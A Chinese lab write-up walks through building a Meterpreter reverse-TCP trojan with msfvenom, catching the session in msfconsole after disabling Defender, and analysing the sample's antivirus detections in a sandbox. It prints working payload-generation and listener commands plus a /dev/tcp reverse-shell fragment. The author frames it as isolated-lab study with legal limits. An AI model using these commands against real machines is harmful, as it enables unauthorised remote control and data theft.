---
title: '远程控制（一）：用 msfvenom 造一个木马，再把它送进沙箱'
date: 2026-11-10 21:00:00
updated: 2026-11-10 21:00:00
categories:
  - 网络渗透
tags:
  - Meterpreter
  - msfvenom
  - 远程控制
  - 免杀
  - 沙箱分析
description: 在 Kali 上生成 Meterpreter 被控端并在 Windows 上控住，再把样本送进微步云沙箱，看 11/28 引擎如何直接点名 Meterpreter。
cover: /img/index-banner.jpg
top_img: /img/index-banner.jpg
---
> ch6 的作业里，远程控制要复现 PPT 第 9、10 两页：在 Kali 上生成一个被控端，在 Windows 上跑起来，然后从 Kali 那边把它控住。
>
> 这篇记的是完整过程，以及过程中三次踩坑：`/root` 没权限写、msfconsole 窗口丢了、**监听和双击的顺序反了会静默失败**。
>
> 最后一节把生成的 exe 送去微步云沙箱检测。结果是 **11/28 引擎判恶意，微软直接点名 `Meterpreter`**——正好回答了一个容易被忽略的问题：**既然这工具这么猛，为什么现实里还打不进去？**

环境：Kali `192.168.23.128`（攻击机）+ Windows 11 `192.168.23.1`（被控端），VMware NAT 同网段。

> 这次全程只在自己机器的 VMware 隔离网段里做。**把生成的 exe 用到别人机器上是犯罪**，第 5 节会具体说清边界。

---

### 目录

- [第 1 站：正向连接和反向连接，到底该选哪个](#第-1-站：正向连接和反向连接，到底该选哪个)
- [第 2 站：msfvenom —— 造一个被控端](#第-2-站：msfvenom-——-造一个被控端)
- [第 3 站：msfconsole —— 等它连回来](#第-3-站：msfconsole-——-等它连回来)
- [第 4 站：把 exe 送进 Windows 并触发](#第-4-站：把-exe-送进-Windows-并触发)
- [第 5 站：进沙箱 —— 它被测出了什么](#第-5-站：进沙箱-——-它被测出了什么)
- [附录](#附录)

---

## 第 1 站：正向连接和反向连接，到底该选哪个

### 1.1 先看 PPT 第 4、5 页在讲什么

PPT 把远程控制拆成两种连接方向：

| | 正向连接（PPT 第 4 页） | 反向连接（PPT 第 5 页） |
|---|---|---|
| 谁主动 | **主控端**去找被控端 | **被控端**回来找主控端 |
| 前提 | 需要知道被控端的 IP + 端口 | 需要被控端能访问主控端 |
| PPT 里标的缺点 | **NAT / 防火墙 / 内网** | — |

PPT 第 4 页专门把 `NAT`、`防火墙`、`内网` 三个词标出来问「缺点是什么」，答案就在这三个词里：

```
正向连接：
  攻击者 ──→ 找被控端 IP ──→ 穿过 NAT ──→ 穿过防火墙 ──→ 进去

被控端在内网：没有公网 IP，根本找不到
被控端开防火墙：端口根本没放行
→ 两个条件随便中一个，正向就连不上
```

**而反向连接反过来用**：

```
反向连接：
  被控端 ──→ 主动连出去 ──→ 攻击者的公网 IP

内网出去一般不拦（NAT 天生允许出站）
防火墙一般只拦入站
→ 只要被控端能上网，就能连回来
```

### 1.2 所以这次选 reverse_tcp

`msfvenom` 的 payload 名字里就带着这个选择：

```
windows/meterpreter/reverse_tcp
                    ↑
              反向 TCP
```

拆开看这三段：

| 片段 | 含义 |
|---|---|
| `windows` | 目标平台，决定生成什么格式的可执行文件 |
| `meterpreter` | 会话类型——不是普通 shell，而是一个功能完整的内存后门 |
| `reverse_tcp` | **连接方向**：被控端主动连回 |

如果换成 `bind_tcp`，那就是正向连接：payload 在被控端监听一个端口，等你去连。**在家用 NAT 网络里，那个端口你永远连不到。**

### 1.3 Meterpreter 比普通 shell 强在哪

普通反弹 shell（`/bin/bash -i >& /dev/tcp/...`）给你的是一个命令行。Meterpreter 给你的是**一套 API**：

| 能力 | 命令 | 普通 shell 能做吗 |
|---|---|---|
| 系统信息 | `sysinfo` | 能（`uname` / `systeminfo`） |
| 磁盘列表 | `show_mount` | 能，但要写一长串 |
| 截屏 | `screenshot` | **不能**（没图形上下文） |
| 键盘记录 | `keyscan_start` | 不能 |
| 内存中加载模块 | `load` | 不能 |
| 文件上传下载 | `upload` / `download` | 不能（除非另有工具） |

关键差别在于：**Meterpreter 完全运行在内存里，不落盘**。`meterpreter` 的 stage 是注入到某个进程里跑的，硬盘上看不到文件。这也是它能绕过一部分检测的原因——直到沙箱开始做内存取证。

---

## 第 2 站：msfvenom —— 造一个被控端

### 2.1 先确认自己的 IP

造 payload 前必须先知道**自己的 IP**，因为要写进 payload 里。

```bash
ip a
```

![Kali 的 IP](/img/rc1-01-kali-ip.png)

看 `eth0` 下面那行：

```
inet 192.168.23.128/24 brd 192.168.23.255 scope global dynamic noprefixroute eth0
```

**`LHOST` 就是 `192.168.23.128`。**

> 这一步看着像废话，但它是新手最容易翻车的地方。我第一次截图时是在 **Metasploitable 靶机**（`.129`）里执行 `ip a`，结果差点把 `.129` 当成自己的 IP 填进去——那样 payload 会去连靶机自己，永远连不回来。

### 2.2 生成命令

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.23.128 LPORT=5000 -f exe -o payload.exe
```

逐段拆：

| 参数 | 值 | 作用 | 填错的后果 |
|---|---|---|---|
| `-p` | `windows/meterpreter/reverse_tcp` | 选 payload 类型 | 生成的不是 Windows 程序 |
| `LHOST=` | `192.168.23.128` | 回连地址 | **填错就永远连不回来** |
| `LPORT=` | `5000` | 回连端口 | 和监听端不一致就永远连不上 |
| `-f` | `exe` | 输出格式 | `-f raw` 得到的是裸 shellcode，不是可执行文件 |
| `-o` | `payload.exe` | 保存路径 | — |

### 2.3 第一次就翻车：/root 没权限

第一次我照着 PPT 的写法存到了 `/root/payload.exe`：

```bash
msfvenom ... -o /root/payload.exe
```

报错：

```
Payload size: 355 bytes
Final size of exe file: 7168 bytes
Error: Permission denied @ rb_sysopen - /root/payload.exe
```

**注意前面两行已经打印了 `Payload size` 和 `Final size`——payload 其实已经生成成功了，只是最后写文件时被拒。**

原因：`/root/` 只有 root 能写，而当时是普通用户 `kali`。

**修法不是加 `sudo`**，而是换个目录：

```bash
msfvenom ... -o payload.exe
```

`-o` 后面只写文件名、不带路径，就会存到当前目录（`~`，也就是 `/home/kali/`）。

> 为什么不用 `sudo`？因为待会儿要把这个文件传给 Windows，放在家目录里 `python3 -m http.server` 能直接共享出去；放在 `/root` 里还得再用 `sudo` 复制一次。**能用普通用户完成的事，别用 root 做**——这句话在写修复方案时还会出现。

成功输出：

```
Payload size: 355 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
```

![msfvenom 生成成功](/img/rc1-02-msfvenom.png)

### 2.4 这两个数字有含义

```
Payload size: 355 bytes          ← 原始 shellcode 大小
Final size of exe file: 7168 bytes  ← 封装成 PE 文件后的大小
```

**355 字节是很小的**。这一点在沙箱那一步会变成关键——它意味着这个 exe **几乎全是壳**，真正的恶意逻辑只有 355 字节的指令，剩下 7 KB 是 PE 头和导入表这类模板化的东西。

验证文件：

```bash
ls -lh ~/payload.exe
```

```
-rw-r--r-- 1 kali kali 7.0K Nov  9 08:22 /home/kali/payload.exe
```

---

## 第 3 站：msfconsole —— 等它连回来

### 3.1 启动

```bash
msfconsole
```

第一次启动会慢（10–30 秒），出现 `msf6 >` 提示符就绪。

### 3.2 四条命令设置监听

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.23.128
set LPORT 5000
```

**这四条分别在做什么：**

| 命令 | 作用 |
|---|---|
| `use exploit/multi/handler` | 加载一个**通用接收器**。它本身不攻击任何东西，只等 payload 连进来 |
| `set payload ...` | 告诉接收器"我等来的东西长什么样" |
| `set LHOST` | 监听哪个地址（写 `0.0.0.0` 也行，监听所有网卡） |
| `set LPORT` | 监听哪个端口 |

**这里最容易错的是 `set payload`**：必须和 `msfvenom` 的 `-p` **一字不差**。不一致的话，握手阶段就对不上，你会看到一个连上了又立刻断开的会话，或者干脆什么都没有。

### 3.3 确认配置

```
show options
```

关键三行：

```
Name      Current Setting    Required
----      ---------------    --------
LHOST     192.168.23.128     yes
LPORT     5000               yes
```

### 3.4 一个反直觉的坑：窗口会"消失"

设置完之后我去找传输文件的命令，新开了一个终端标签页。回来发现 **msfconsole 那个标签找不到了**。

先分清两种情况：

```bash
ps aux | grep msfconsole | grep -v grep
```

- **有输出** → 进程还在，只是窗口被切到后台了。用 `Ctrl+PageUp` / `Ctrl+PageDown` 切标签页找回来。
- **无输出** → 真的没了，重新启动、重新配四条。

**注意：`python3 -m http.server` 是另一个独立进程，关 msfconsole 不影响它。** 这个区分很重要——第一次我以为全都得重来。

### 3.5 一个顺序问题（这次没踩，但值得单独说）

**`run` 必须在双击 exe 之前执行。**

```
正确的顺序：
  run  →  Started reverse TCP handler on ...  →  双击 exe  →  会话建立

错误的顺序：
  双击 exe  →  exe 立刻尝试连 5000  →  没人监听  →  连接被拒  →  进程退出
                 ↑
        而且它不会给你任何提示，双击之后屏幕上什么也不会发生
```

**这个失败方式特别隐蔽**：没有报错弹窗、没有日志、任务管理器里进程一闪就没了。初学者很容易以为"payload 有问题"，然后去重新生成几十次。

判断方法只有一个：**看 msfconsole 里有没有 `Started reverse TCP handler`**。没有这一行，后面做什么都是白做。

---

## 第 4 站：把 exe 送进 Windows 并触发

### 4.1 关闭 Defender（必做）

Windows Defender 对 Meterpreter 的检测**极其准**（沙箱那节的数据会证明这一点）。不关的话，exe 一落地就被删，你连双击的机会都没有。

路径：

```
设置 → 隐私和安全性 → Windows 安全中心
  → 病毒和威胁防护 → 管理设置
    → 实时保护：关
    → 云保护：关
    → 自动提交样本：关
```

会出现 "你的设备可能易受攻击" 的提示，**这是正常的，做完必须恢复**。

### 4.2 传文件：让 Windows 主动来下载

这里我用的是 Kali 开临时服务、Windows 浏览器来下载：

```bash
cd ~ && python3 -m http.server 8000
```

Windows 浏览器打开：

```
http://192.168.23.128:8000/payload.exe
```

**为什么走这个方向？** 因为 Windows 防火墙默认拦入站、允许出站。让 Windows 主动去拉文件，就绕开了入站限制。（上一篇做 vsftpd 时，`nmap` 扫 Windows 的 8000 端口是 `filtered`，就是同一个原因。）

Kali 那边会看到一行访问日志，这就是"文件已经进 Windows 了"的证据：

```
192.168.23.1 - - [09/Nov/2026 21:xx:xx] "GET /payload.exe HTTP/1.1" 200 -
```

### 4.3 执行顺序：先 run，后双击

回到 msfconsole：

```
run
```

看到：

```
[*] Started reverse TCP handler on 192.168.23.128:5000
```

**然后立刻去 Windows 双击 `payload.exe`。** 双击后屏幕上不会有任何反应——这是正常的，反向连接不会弹窗口。

### 4.4 会话建立

几秒后 msfconsole 里出现：

```
[*] Sending stage (199238 bytes) to 192.168.23.1
[*] Meterpreter session 1 opened (192.168.23.128:5000 -> 192.168.23.1:51956)
```

![会话建立](/img/rc1-03-session.png)

**这三行值得逐个读懂：**

| 行 | 含义 |
|---|---|
| `Started reverse TCP handler` | 监听起来了 |
| `Sending stage (199238 bytes)` | **把 199 KB 的 Meterpreter 主体推给被控端** |
| `Meterpreter session 1 opened` | 会话建立，`->` 左边是主控端，右边是被控端 |

注意 `199238 bytes` —— 这就是第 2 节提到的"stage"。**355 字节的 stub 只负责把 stage 拉下来，真正的功能在那个 199 KB 里。**

### 4.5 三条命令做证据

进到 `meterpreter >` 之后：

```
sysinfo
```

![sysinfo 与 show_mount](/img/rc1-04-sysinfo-mount.png)

```
Computer        : WIN-38J04LD038G
OS              : Windows 11 24H2+ (10.0 Build 26200).
Architecture    : x64
System Language : zh_CN
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

```
show_mount
```

```
Name  Type    Size (Total)  Size (Free)  Mapped to
C:\   fixed   400.00 GiB    296.50 GiB
D:\   fixed   169.54 GiB     92.84 GiB
E:\   fixed   217.06 GiB    178.94 GiB
F:\   fixed   166.02 GiB    163.97 GiB
```

**这三条就是完整的证据链：**

| 证据 | 证明了什么 |
|---|---|
| `sysinfo` | **我在哪台机器上** —— 主机名、系统版本、架构 |
| `Logged On Users : 2` | 有 2 个用户登录着，这是真实的桌面环境 |
| `show_mount` | **我能列它的所有磁盘** —— 说明有实际的文件系统访问权，不是一个空壳 |

**`Meterpreter : x86/windows`** 和 `Architecture : x64` 的对比很有意思：系统是 64 位，但 payload 是 32 位。因为 `msfvenom` 没指定 arch 时默认用 `x86`（第 2 节输出里那行 `selecting arch: x86 from the payload`）。32 位进程在 64 位系统上能正常跑（WOW64），**只是会话不能直接注入 64 位进程**。这是个小遗憾，但不影响功能。

### 4.6 到这里就该停了

我拿到了管理员权限，能看到全部分区。**那能不能顺便建个账号？装个服务让它开机自启？**

**不能。**

理由不是道德说教，是实际的：

- 这是**我自己正在用的电脑**，做持久化等于给自己埋雷；
- 一旦写了启动项，后面删 exe 也删不干净；
- 真实项目里，**"证明能访问"和"破坏系统"是性质完全不同的两件事**——前者是渗透测试，后者是破坏证据/刑事犯罪。

PPT 第 5 页用"弹计算器"来体现这条线：证明能执行任意代码，但不做破坏性动作。我这里的等价物是 `id` 级别的输出——`sysinfo` + `show_mount` 就够。

---

## 第 5 站：进沙箱 —— 它被测出了什么

### 5.1 为什么要做这一步

`msfvenom` 生成的东西**在杀软眼里是什么样**？这个问题光靠实验回答不了——实验里 Defender 是关的，等于把对手的眼睛蒙上了。

所以要把 exe 送到微步云沙箱（`https://s.threatbook.com/`），让它在一个**开着各种检测的正常 Windows 10** 里跑一遍。

### 5.2 总判定

![沙箱总判定](/img/rc1-09-sandbox-verdict.png)

```
文件大小   7 KB
文件类型   PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections
引擎检出   11 / 28
威胁分类   木马
木马家族   Agent
判定      恶意
```

SHA256：`7c771ad7efd5f72fbf0e9fec2d70b81bd1d0cfb19766d8578a808bfa17d1c1ad`

**`PE32 ... 5 sections`** 这一行说明它是真实可执行的 PE 文件，不是空壳。`5 sections` 是典型的 msfvenom 输出结构：

| 段 | 作用 |
|---|---|
| `.text` | 355 字节的 shellcode 在这里 |
| `.rdata` | 只读数据 |
| `.data` | 可读写数据 |
| `.rsrc` | 资源（图标、清单） |
| `.reloc` | 重定位信息 |

### 5.3 多引擎检出——这一页最有信息量

![多引擎检出](/img/rc1-10-engines.png)

| 引擎 | 检出名称 |
|---|---|
| **微软（MSE）** | `Trojan:Win32/Meterpreter.RPZ!MTB` |
| **大蜘蛛（DrWeb）** | `BackDoor.Meterpreter.1462` |
| **Avast** | `Win32:MsfShell-E` |
| **AVG** | `Win32:MsfShell-E` |
| 卡巴斯基 | `HEUR:Trojan.Win32.Agent.gen` |
| 小红伞（Avira） | `TR/Crypt.XPACK.Gen` |
| GDATA | `Gen:Variant.Application.Lazy8...` |
| NANO | `Virus.Win32.Gen.ccmw` |
| ESET | `a variant of Win32/Rozena.BZ...` |
| 熊猫（Panda） | `Trj/Genetic.gen` |
| K7 | `Trojan ( 00117be11 )` |
| Ikarus | 无检出 |

**注意这几个名字里藏着什么：**

```
Meterpreter    ← 工具名直接写出来了
MsfShell       ← Msf = Metasploit Framework
BackDoor       ← 归类为后门
```

**`Meterpreter` 和 `MsfShell` 不是"怀疑像"，是"直接点名"。** 微软和 Avast 的引擎里内置了针对 Metasploit 的特征库——你用什么工具生成的东西，它一眼就知道。

### 5.4 Sigma 规则命中了什么

![Sigma 规则](/img/rc1-11-sigma.png)

```
PsExec Tool Execution   →  execution; t1035; t1569.002; s0029
PsExec Service Start    →  execution; t1035; t1569.002
```

**这两条是行为相似导致的误报，不是真实行为。**

原因：`msfvenom` 的 payload 在提权/持久化时会用「创建服务 → 启动服务」这套手法，和 PsExec 完全一致：

```
PsExec：        SMB 连过去 → 创建 PsExecSvc 服务 → 启动 → 执行命令
Meterpreter：   创建服务 → 启动 → 注入进程
                          ↑
                    这一段一模一样
```

所以 Sigma 规则（基于行为模式匹配）把两者归成一类了。

**但这里有个更有意思的点**：这两条规则的危险等级都标 **低**，而且是在 `execution` 阶段命中——说明沙箱认为"这个行为本身不足以判定恶意，需要结合其他证据"。最终判恶意，靠的是**引擎的静态特征 + 后面的网络行为**。

**这就是"多层检测"的设计意图**：任何单层都可能误报，几层叠在一起才下结论。

### 5.5 一个反直觉的结论：为什么实验成功，现实不行

这份报告最值得琢磨的地方在这里：

| 在实验里 | 在沙箱里 |
|---|---|
| Defender 关闭 | **11 个引擎同时报警** |
| 只有我这台机器跑 | 分析环境是 "Win10 1903 64bit" |
| NAT 隔离，没有出站监测 | 有完整的网络行为监控 |
| 我知道 LHOST 是 `.128` | 沙箱看的是"它要连哪去了" |

**同样一个文件，在两种环境里的命运完全相反。**

这说明一件事：**实验成功的条件是我自己造出来的**——关杀软、断网、隔离。现实中这三个条件都不成立：

- 企业环境有 EDR，不只是杀软
- 邮件网关会拦附件
- 下载链接会被沙箱预检
- 出站流量有 DNS 日志和流量分析

**所以"生成一个木马"和"攻入一台机器"之间，差的不是技术，是绕过所有这些检测的能力。** 这个能力的名字叫免杀（avasion），是另一个完整的话题——加壳、分离加载、白利用、内存加密，本质都是在和这 11 个引擎打拉锯战。

### 5.6 一个没能拿到的结果

微步的免费账号只能看静态部分（`情报IOC` / `多维检测` / `引擎检测` / `静态分析`）。**`行为检测` 和 `配置提取` 需要更高权限。**

后者本来是最想看的一页——如果能提取出配置，会直接显示：

```
LHOST: 192.168.23.128
LPORT: 5000
```

**那就等于沙箱把我写的木马"解剖"了，连我填的 IP 都读出来了。**

拿不到也没关系。11/28 的检出率 + `Meterpreter` 直接点名，证据已经够强——它回答的是"这个文件是什么"，比"它要连哪儿"更根本。

---

## 附录

### A.1 命令速查

| 目的 | 命令 |
|---|---|
| 看自己的 IP | `ip a` |
| 生成 payload | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<你的IP> LPORT=5000 -f exe -o payload.exe` |
| 启动控制台 | `msfconsole` |
| 配置监听 | `use exploit/multi/handler` → `set payload ...` → `set LHOST ...` → `set LPORT ...` |
| 确认配置 | `show options` |
| 开始监听 | `run` |
| 开临时下载服务 | `python3 -m http.server 8000` |
| 会话内看系统 | `sysinfo` |
| 会话内看磁盘 | `show_mount` |
| 会话内截屏 | `screenshot` |
| 退出会话 | `exit` |

### A.2 这次踩的三个坑

| 坑 | 现象 | 根因 | 解法 |
|---|---|---|---|
| 1 | `Error: Permission denied @ rb_sysopen - /root/payload.exe` | `/root` 只有 root 能写，当前是普通用户 | `-o payload.exe` 存到家目录 |
| 2 | msfconsole 窗口"消失" | 新开了标签页，或进程被关 | `ps aux \| grep msfconsole` 判断是哪种 |
| 3 | 双击后毫无反应，会话不出现 | **`run` 没先执行**，连接被拒 | 必须先看到 `Started reverse TCP handler` 再双击 |

### A.3 判断"真的控住了"的三条证据

| 证据 | 命令 | 说明 |
|---|---|---|
| 身份 | `sysinfo` | 主机名 + OS 版本，证明是哪台机器 |
| 权限 | `show_mount` | 能列全部磁盘，证明有文件系统访问权 |
| 环境真实 | `Logged On Users : 2` | 有真实用户登录着，不是空容器 |

### A.4 边界：这一步到哪为止

| 情形 | 性质 |
|---|---|
| 自己 VMware 里的虚拟机 | **合法**，学习实验 |
| 明确授权、有授权书的渗透测试 | **合法**，但严格守范围 |
| 别人的机器（哪怕只是"试一下能不能连"） | **违法** |
| 在学校/公司内网做"测试"但没有书面授权 | **违法**，很多人栽在这 |

**"我只是生成了一下，没运行"不是免责理由。** 在我国法律下，制作、传播计算机病毒等破坏性程序本身就有责任。

我自己的规矩：**只在我自己的 `192.168.23.0/24` 网段动手**，这个网段里只有我的 Kali 和我的 Windows。出了这个网段，一个包都不发。

### A.5 下一篇

这篇讲的是「生成一个独立的恶意文件，送到目标上执行」。它的特点是：

- 需要**让目标运行一个文件**
- 被杀软识别率**极高**（11/28）
- 会话**一死就断**，重启电脑就没了

下一篇（远程控制二）走另一条路：**不送任何文件，只往目标网站扔一个 PHP 文件**。这条路不依赖杀软，但权限只有 `www-data`。

两种方式放在一起看，才能说清"远程控制"这件事的全貌。
